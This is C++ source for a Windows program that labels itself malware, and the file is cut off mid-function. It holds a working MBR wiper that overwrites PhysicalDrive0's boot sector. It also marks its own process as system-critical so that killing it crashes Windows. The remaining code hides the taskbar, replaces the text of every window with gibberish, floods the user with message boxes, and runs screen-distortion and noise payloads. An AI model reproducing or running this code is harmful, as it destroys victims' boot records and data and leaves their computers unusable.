// sinX.cpp : malware
//

#include <Windows.h>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include <tchar.h>
#include "bootrec.h"
#define M_PI   3.14159265358979323846264338327950288
#define SquareWave(t, freq, sampleCount) (((BYTE)(2.f * (FLOAT)(freq) * ((t) / (FLOAT)(sampleCount))) % 2) == 0 ? 1.f : -1.f)
#define TriangleWave(t, freq, sampleCount) (4.f * ( FLOAT )fabs(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq))) - floor(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq)))) - .5f) - 1.f)
HCRYPTPROV hProv;
INT random() {
	if (hProv == NULL)
		if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	INT nOut;
	CryptGenRandom(hProv, sizeof(nOut), (BYTE*)(&nOut));
	return nOut & 0x7fffffff;
}
/*typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;*/
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int stage = 0;
int r = 0, g = 0, b = 0;
COLORREF Hue(int shift) { //credits to Malsteve527 for the Hue function
	switch (stage) {
	case 0:
		r = 255;
		b = 0;
		g < 255 ? g += shift : stage++;
		break;
	case 1:
		g = 255;
		b = 0;
		r > 0 ? r -= shift : stage++;
		break;
	case 2:
		g = 255;
		r = 0;
		b < 255 ? b += shift : stage++;
		break;
	case 3:
		b = 255;
		r = 0;
		g > 0 ? g -= shift : stage++;
		break;
	case 4:
		b = 255;
		g = 0;
		r < 255 ? r += shift : stage++;
		break;
	case 5:
		r = 255;
		g = 0;
		b > 0 ? b -= shift : stage = 0;
		break;
	}

	return RGB(r, g, b);
}
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI notaskbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}
LPCWSTR randomWords(int len) { //holy recycled
	wchar_t* ustr = new wchar_t[len + 1];
	for (int i = 0; i < len; i++) {
		ustr[i] = L'A' + (rand() % 26);
	}
	ustr[len] = L'\0';
	return ustr;
}
DWORD WINAPI texts(LPVOID lpParam) {
	while (true) {
		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
		Sleep(1000);
	}
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)randomWords(rand() % 10 + 10), SMTO_ABORTIFHUNG, 100, NULL);
	return true;
}
DWORD WINAPI msg(LPVOID lpParam) {
	LPCWSTR string = L"Internal error";

	while (1) {
		int fx = rand() % 7;

		DWORD msg = 0;
		msg += random() % 7;           // Random buttons
		msg += (random() % 5) << 4;    // Random icon

		MessageBoxW(NULL, string, L"Windows", msg);

		//Some cool randomic strings
		if (fx == 0) string = L"YOUR BANNED!";
		if (fx == 1) string = L"@Sensist2K05 using alts?";
		if (fx == 2) string = L"nothing compared to nazar and venra\n2 skids in one is too powerful";
		if (fx == 3) string = L"jerry's bait shop vs watchman of doom, who wins - sixtyfour64";
		if (fx == 4) string = L"Conflab is :joy: :tada:";
		if (fx == 5) string = L"why are you reading";
		if (fx == 6) string = L"syfm - N17Pro3426";
	}
	return 0x00;
}
DWORD WINAPI bright(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCPAINT);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
namespace Math
{
	//A = amplitude
	//B = frequency
	//C = phase displacement
	//D = period
	FLOAT SineWave2(FLOAT a, FLOAT b, FLOAT c, FLOAT d)
	{
		return a * sin(2 * M_PI * b * c / d);
	}
}
DWORD WINAPI wave(LPVOID lpParam) { //credits to JhoPro
	HDC dc = GetDC(NULL);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	int i = 0;

	while (1)
	{
		for (int y = 0; y < h; y++)
		{
			HDC dc = GetDC(NULL);

			int wavePhase = rand() % 70 - 40;
			int zx = Math::SineWave2(5, y + i * 4, wavePhase, h);
			BitBlt(dc, 0, y, w - zx, 1, dc, zx, y, SRCCOPY);

			ReleaseDC(NULL, dc);
			DeleteDC(dc);
			Sleep(10);
		}
	}

	return 0x00;
}
DWORD WINAPI inv(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	INT w = GetSystemMetrics(SM_CXSCREEN);
	INT h = GetSystemMetrics(SM_CYSCREEN);

	while (1) {
		HDC hdc = GetDC(NULL);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);

		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
		Sleep(1000);
	}
	return 0x00;
}
DWORD WINAPI textz(LPVOID lpParam) { //credits to NTFSFormatted
	HDC hdc = GetDC(0);
	INT w = GetSystemMetrics(0);
	INT h = GetSystemMetrics(1);
	INT i = 0;
	while (1) {
		HDC hdc = GetDC(0);
		i++;

		LPCWSTR lpcwStrings[6] = {
			L"Gulp Gulp 8000 Land, by Neck Guy!",
			L"Brian! Yes Peter? - Peter and Brian",
			L"Sarah and Duck is the WORST!!! Cocomelon Bettr!!!",
			L"HOLY XOLTUS GUYS HE RAN THE MALWARE!!!",
			L"oh my xoltus.. what did you do to your PC???",
			L"Petition to stop Handy Manny and Higglytown Heroes!"
		};

		HFONT hFont = CreateFontW(rand() % 32 + 64, 0, rand() % 64, 0, FW_MEDIUM, FALSE, TRUE, FALSE, OEM_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, 0, FF_DONTCARE, L"Comic Sans MS");
		SelectObject(hdc, hFont);
		SetBkColor(hdc, RGB(i, i, i));
		SetTextColor(hdc, Hue(3));
		for (INT i = 0; i < 6; i++) {
			TextOutW(hdc, rand() % w, rand() % h, lpcwStrings[i], lstrlenW(lpcwStrings[i]));
		}
		if (i >= 255)
			i = 0;

		ReleaseDC(NULL, hdc);
		Sleep(100);
	}
}
DWORD WINAPI darken(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCAND);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	INT xxx = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = sqrt(y & ((x + i) + (y + i)));

				rgbquad[index].rgbRed += fx + 16;
				rgbquad[index].rgbGreen += fx + 32;
				rgbquad[index].rgbBlue += fx + 64;
			}
		}

		i++;
		xxx += 2;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader2(LPVOID lpvd) { //credits to soheil shahrab, but I modified it
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	UINT u;
	UINT v;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				FLOAT a = TriangleWave(i * 8 + y / 2, 2, screenWidth) * SquareWave(i * 8 + y / 2, 2, screenHeight) * 4.f;
				FLOAT b = TriangleWave(i * 8 + x / 2, 2, screenWidth) * SquareWave(i * 8 + y / 2, 2, screenHeight) * 4.f;

				FLOAT offset = a + b;

				INT srcX = (int)(offset) % screenWidth;
				INT srcY = (int)(offset) % screenHeight;

				FLOAT fx = (x ^ y) + (i + i * 10) * (a * b);

				u = x + (INT)a;
				v = y + (INT)b;

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI swirl(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 100, ySize = 9;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sh * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
		}
		for (int i = 0; i < sw * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
		Sleep(1);
	}
}
DWORD WINAPI swirl2(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 9, ySize = 9;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sh * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
		}
		for (int i = 0; i < sw * 2; i++) {
			int wave = cos(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
		Sleep(1);
	}
}
DWORD WINAPI inv2(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	INT w = GetSystemMetrics(SM_CXSCREEN);
	INT h = GetSystemMetrics(SM_CYSCREEN);
	while (1) {
		HDC hdc = GetDC(NULL);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
		Sleep(1000);
	}
	return 0x00;
}
DWORD WINAPI shader3(LPVOID lpParam) { //fuck you camellia
	int i = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);

		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };

		RGBQUAD* rgbquad = NULL;
		HSL hslcolor;

		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				float fx = sqrt(2 * i);

				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);

				hslcolor.s = 1.f;
				hslcolor.l += .1f;

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;

		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);

		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(10);
	}

	return 0x00;
}
DWORD WINAPI ripple(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 9, ySize = 9;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sh * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
		}
		for (int i = 0; i < sw * 2; i++) {
			int wave = cos(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, 0, i, sw, 5, hdcMem, wave, i, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
		Sleep(1);
	}
}
DWORD WINAPI shader4(LPVOID lpParam) { //credits to soheil shahrab, but I modified it
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	UINT u;
	UINT v;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				FLOAT a = TriangleWave(i * 8 + y / 2, 2, screenWidth) * SquareWave(i * 8 + y / 2, 2, screenHeight) * 4.f;
				FLOAT b = TriangleWave(i * 8 + x / 2, 2, screenWidth) * SquareWave(i * 8 + y / 2, 2, screenHeight) * 4.f;

				FLOAT offset = a + b;

				INT srcX = (int)(offset) % screenWidth;
				INT srcY = (int)(offset) % screenHeight;

				FLOAT fx = (225 * i) + (i + i * 10) * (a * b);

				u = x + (INT)a;
				v = y + (INT)b;

				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx) / 10000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;

				if (hslcolor.l < .4f)
				{
					hslcolor.l += .2f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
BOOL CALLBACK EnumChildWindowsProc(HWND hwnd, LPARAM lParam) {
	RECT rcWindow;
	GetWindowRect(hwnd, &rcWindow);
	int cxWindow = rcWindow.right - rcWindow.left;
	int cyWindow = rcWindow.bottom - rcWindow.top;
	HDC hdcWindow = GetDC(hwnd);
	BitBlt(hdcWindow, 0, 0, cxWindow, cyWindow, hdcWindow, random() % 21 - 10, random() % 41 - 20, !(random() % 2) ? SRCAND : SRCPAINT);
	ReleaseDC(NULL, hdcWindow);
	DeleteObject(hdcWindow);

	EnumChildWindows(hwnd, EnumChildWindowsProc, NULL);
	Sleep(3000);
	return true;
}
DWORD WINAPI WindowsCorruptionPayload(LPVOID lpParam) {
	for (;;) {
		EnumChildWindows(GetForegroundWindow(), EnumChildWindowsProc, NULL);
		Sleep(3000);
	}
}
DWORD WINAPI shaderLAST(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	int ws = w / 2;
	int hs = h / 2;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				//CenterX and CenterY
				int cx = (x - (w / 2));
				int cy = (y - (h / 2));

				//2D Rotating Matrix
				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				//XOR Pattern
				int fx = (zx + i) ^ (zy + i);

				rgbquad[index].rgbRed += (fx + 16);
				rgbquad[index].rgbGreen -= (fx + 32);
				rgbquad[index].rgbBlue += (fx + 64);
			}
		}

		i++; angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
		Sleep(1000);
	}

	return 0x00;
}
DWORD WINAPI whatthefuck(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);

		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCERASE);
		StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCINVERT);
		StretchBlt(hdc, 0, 0, w, h, hdc, w, 0, -w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t & t ^ t >> 10) ^ (t >> 9) * (t >> 4) + (t * t) ^ (t >> 100);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t & t ^ t >> 9) ^ (t >> 6) & (t >> 4) ^ (t * 9) ^ (t >> 100);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t & t >> 9) + (t >> 9) * (t >> 9) * (t >> 1) ^ (t * 100);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t ^ (t >> 1 & t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
